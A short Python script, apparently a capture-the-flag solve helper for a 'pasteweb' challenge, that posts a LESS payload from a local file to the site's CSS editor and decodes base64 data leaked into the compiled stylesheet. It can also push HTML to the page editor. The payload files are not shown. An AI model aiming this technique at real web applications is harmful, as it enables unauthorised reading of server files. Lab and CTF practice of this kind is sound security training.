import requests
import re
import base64
import configparser

config = configparser.ConfigParser()
config.read('config.ini')
share = config['config']['share']
session_id = config['config']['session_id']
editcss_url = 'https://pasteweb.ctf.zoolab.org/editcss.php'
edithtml_url = 'https://pasteweb.ctf.zoolab.org/edithtml.php'
view_url = 'https://pasteweb.ctf.zoolab.org/view.php'
css_url = f'https://pasteweb.ctf.zoolab.org/sandbox/{share}/default.css'

cookie = {'PHPSESSID': session_id}

print(f'{share = }')
print(f'{session_id = }')
def update_css():
    with open('payload.css') as f:
        less = f.read()
    payload = {'less': f'{less}'}
    r = s.post(editcss_url, data=payload, cookies=cookie)
    if 'No' in r.text:
        print(r.text)
        return
    text = s.get(css_url, cookies=cookie).text
    b64 = re.findall('base64,(.+)"', text)[0]
    print(base64.b64decode(b64))

def update_html():
    with open('index.html') as f:
        html = f.read()
    payload = {'html': f'{html}'}
    r = s.post(edithtml_url, data=payload, cookies=cookie)
    if r.status_code != 200:
        print(r)
        return
    text = s.get(view_url, cookies=cookie).text
    print(text)


with requests.Session() as s:
    while True:
        cmd = input('(1) html, (2) css: ')
        if cmd == '1':
            update_html()
        elif cmd == '2':
            update_css()
        else:
            pass
